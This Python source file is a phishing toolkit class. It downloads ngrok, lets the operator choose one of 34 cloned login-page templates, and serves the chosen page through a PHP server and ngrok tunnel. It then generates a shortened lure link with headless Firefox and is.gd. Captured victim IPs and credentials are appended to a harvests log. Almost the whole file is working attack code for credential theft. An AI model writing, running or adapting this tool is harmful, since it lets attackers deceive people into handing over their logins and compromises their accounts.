#!/bin/python3 env

from colorama import Fore, Style
import os
import os.path
import pkg_resources
import platform
import pyautogui
import pyshorteners
import re
import requests
import shutil
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support import expected_conditions as expected
from selenium.webdriver.support.wait import WebDriverWait
import subprocess
from time import sleep
import urllib.request
import zipfile

class Phishing:

	def __init__(self):

		self.resources = pkg_resources.resource_filename(__name__, f'Resources')
		
		arch = str(platform.uname())

		if not os.path.isfile(f'{self.resources}/Binaries/ngrok'):

			if 'arm' in arch or 'Android' in arch:
				urllib.request.urlretrieve('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip', f'{self.resources}/Binaries/ngrok.zip')
				with zipfile.ZipFile(f'{self.resources}/Binaries/ngrok', 'r') as zip_ref:
					zip_ref.extractall(f'{self.resources}/Binaries')
					os.chmod(f'{self.resources}/Binaries/ngrok', 0o777)
					os.remove(f'{self.resources}/Binaries/ngrok.zip')

				
			else:
				urllib.request.urlretrieve('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip', f'{self.resources}/Binaries/ngrok.zip')
				with zipfile.ZipFile(f'{self.resources}/Binaries/ngrok.zip', 'r') as zip_ref:
					zip_ref.extractall(f'{self.resources}/Binaries')
					os.chmod(f'{self.resources}/Binaries/ngrok', 0o777)
					os.remove(f'{self.resources}/Binaries/ngrok.zip')

		# Printing the site templates in two columns for a option menu
		# Warning if there are a odd number of templates in folder you will be missing one on the print
		templates = [ f"{Fore.YELLOW}{opt}) {Fore.GREEN}{t}{Fore.RESET}" for opt, t in enumerate(os.listdir(f'{self.resources}/Templates'), 1) ]
		templates_col_1 = templates[:len(templates)//2]
		templates_col_2 = templates[len(templates)//2:]
		print("\n".join("{} \t\t{}".format(row1, row2) for row1, row2 in zip(templates_col_1, templates_col_2)))

		# Creating a dictionary of templates to match a menu choice from
		template_options = dict(enumerate(os.listdir(f'{self.resources}/Templates'), 1))

		#  assigning the menu choice
		while True:
			try:
				choice = int(input(f"\n{Fore.YELLOW}Which template would you like to use ({Fore.BLUE}1-34{Fore.YELLOW}){Fore.RESET}: "))
				if choice < 1 or choice > 34:
					raise ValueError
				break
			except ValueError:
				print(f"\n{Fore.RED}[ Error ]{Fore.YELLOW} Please enter a numerical value (1-34)")
				sleep(4)
				for repeat in range(4):
					print("\033[A                                                           \033[A")

		# Retrieving the menu choice from the dictionary
		self.template = template_options[choice]

		

	@property
	def connections(self):
		with open(f'{self.resources}/Templates/{self.template}/ip.txt') as f:
			client_data = f.readlines()
					
		os.remove(f'{self.resources}/Templates/{self.template}/ip.txt')

		with open(f"{self.resources}/Logs/harvests.log", "a") as f:
			f.write(f"\n{client_data}")

		return client_data

	@property
	def credentials(self):
		with open(f'{self.resources}/Templates/{self.template}/usernames.txt') as f:
			credential_data = f.readlines()
				
		os.remove(f'{self.resources}/Templates/{self.template}/usernames.txt')

		with open(f"{self.resources}/Logs/harvests.log", "a") as f:
			f.write(f"{credential_data}")

		return credential_data



	def kill_server(self):
		subprocess.call(['bash', '-c', "kill -9 `ps -ef | grep php | grep -v grep | awk '{print $2}'` 2>/dev/null && kill -9 `ps -ef | grep ngrok | grep -v grep | awk '{print $2}'` 2>/dev/null"], stdout=subprocess.PIPE)



	def start_server(self):
		# os.path.isfile(f'{self.resources}/Binaries/ngrok')
		print(f"\n{Fore.YELLOW}[*] {Fore.BLUE}Starting the clone server...")
		subprocess.call(['bash', '-c', f"php -S 127.0.0.1:3333 -t {self.resources}/Templates/{self.template} > /dev/null 2>&1 &"], stdout=subprocess.PIPE)
		sleep(2)

		print(f"\n{Fore.YELLOW}[*] {Fore.BLUE}Starting ngrok...")
		subprocess.call(['bash', '-c', f"cd {self.resources}/Binaries && ./ngrok http 3333 > /dev/null 2>&1 &"], stdout=subprocess.PIPE)
		sleep(2)



	@property
	def get_link(self):
		options = Options()
		options.add_argument('-headless')
		driver = webdriver.Firefox(options=options, service_log_path=f'{self.resources}/Logs/geckodriver.log')
		wait = WebDriverWait(driver, timeout=10)
		driver.get("http://www.localhost:4040/status")
		ngrok_link = wait.until(expected.visibility_of_element_located((By.XPATH, '/html/body/div[2]/div/div/div/div[1]/div[1]/ul/li[1]/div/table/tbody/tr[1]/td'))).text
		long_link = f"{ngrok_link}/{self.template}"
		shortener = pyshorteners.Shortener()
		shortened = shortener.isgd.short(ngrok_link)
		short_link = f"{shortened}/{self.template}"


		return long_link, short_link
